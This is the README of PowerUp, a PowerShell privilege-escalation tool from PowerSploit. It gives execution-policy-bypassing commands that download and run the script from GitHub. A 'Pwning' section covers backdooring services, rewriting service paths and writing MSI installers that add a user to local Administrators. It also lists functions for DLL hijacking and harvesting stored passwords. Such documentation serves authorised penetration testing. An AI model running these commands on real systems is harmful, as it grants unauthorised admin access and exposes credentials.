# PowerUp
PowerUp aims to be a clearinghouse of common Windows privilege escalation
vectors that rely on misconfigurations.

Running Invoke-AllChecks will output any identifiable vulnerabilities along
with specifications for any abuse functions. The -HTMLReport flag will also
generate a COMPUTER.username.html version of the report.

Author: @harmj0y
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None

URL: https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc

## Launching every tests
Two main possibilities:
1. From the PowerShell ISE or a PowerShell session with the right execution policy:
```
PS C:\> IEX (New-Object Net.WebClient).DownloadString("https://github.com/PowerShellMafia/PowerSploit/raw/master/Privesc/PowerUp.ps1")
PS C:\> Invoke-AllChecks [-HTMLReport] [| Out-File -Encoding ASCII checks.txt]
```

2. From a cmd prompt:
```
C:\> powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://github.com/PowerShellMafia/PowerSploit/raw/master/Privesc/PowerUp.ps1'); Invoke-AllChecks"
```

## Pwning
### Service executable permission or unquoted service path issues
1. Backup the service and create a backdoored one which will add <user> to the localgroup Administrators:
```
PS C:\> Write-ServiceEXE -ServiceName <service_name> -UserName <user> -Password <password>
```

2. Restart the service or reboot the machine
3. Restore the backup service:
```
PS C:\> Restore-ServiceEXE -ServiceName <service_name>
```

### Service permission issues
Stop the service, change the path name of the service with *net localgroup Administrators <user> /add* and restart:
```
PS C:\> Invoke-ServiceUserAdd -ServiceName <service_name> -UserName <user> -Password <password>
```

### AlwaysInstallElevated
Write out a custom .msi installer that add your user within the localgroup Administrators and run it elevated privileges:
```
PS C:\> Write-UserAddMSI
```

## More info (man)
Check-out the source code...

### Service Enumeration:
    Get-ServiceUnquoted                 -   returns services with unquoted paths that also have a space in the name
    Get-ModifiableServiceFile           -   returns services where the current user can write to the service binary path or its config
    Get-ModifiableService               -   returns services the current user can modify
    Get-ServiceDetail                   -   returns detailed information about a specified service

### Service Abuse:
    Invoke-ServiceAbuse                 -   modifies a vulnerable service to create a local admin or execute a custom command
    Write-ServiceBinary                 -   writes out a patched C# service binary that adds a local admin or executes a custom command
    Install-ServiceBinary               -   replaces a service binary with one that adds a local admin or executes a custom command
    Restore-ServiceBinary               -   restores a replaced service binary with the original executable

### DLL Hijacking:
    Find-ProcessDLLHijack               -   finds potential DLL hijacking opportunities for currently running processes
    Find-PathDLLHijack                  -   finds service %PATH% DLL hijacking opportunities
    Write-HijackDll                     -   writes out a hijackable DLL

### Registry Checks:
    Get-RegistryAlwaysInstallElevated   -   checks if the AlwaysInstallElevated registry key is set
    Get-RegistryAutoLogon               -   checks for Autologon credentials in the registry
    Get-ModifiableRegistryAutoRun       -   checks for any modifiable binaries/scripts (or their configs) in HKLM autoruns

### Miscellaneous Checks:
    Get-ModifiableScheduledTaskFile     -   find schtasks with modifiable target files
    Get-UnattendedInstallFile           -   finds remaining unattended installation files
    Get-Webconfig                       -   checks for any encrypted web.config strings
    Get-ApplicationHost                 -   checks for encrypted application pool and virtual directory passwords
    Get-SiteListPassword                -   retrieves the plaintext passwords for any found McAfee's SiteList.xml files
    Get-CachedGPPPassword               -   checks for passwords in cached Group Policy Preferences files

### Other Helpers/Meta-Functions:
    Get-ModifiablePath                  -   tokenizes an input string and returns the files in it the current user can modify
    Get-CurrentUserTokenGroupSid        -   returns all SIDs that the current user is a part of, whether they are disabled or not
    Add-ServiceDacl                     -   adds a Dacl field to a service object returned by Get-Service
    Set-ServiceBinPath                  -   sets the binary path for a service to a specified value through Win32 API methods
    Test-ServiceDaclPermission          -   tests one or more passed services or service names against a given permission set
    Write-UserAddMSI                    -   write out a MSI installer that prompts for a user to be added
    Invoke-AllChecks                    -   runs all current escalation checks and returns a report
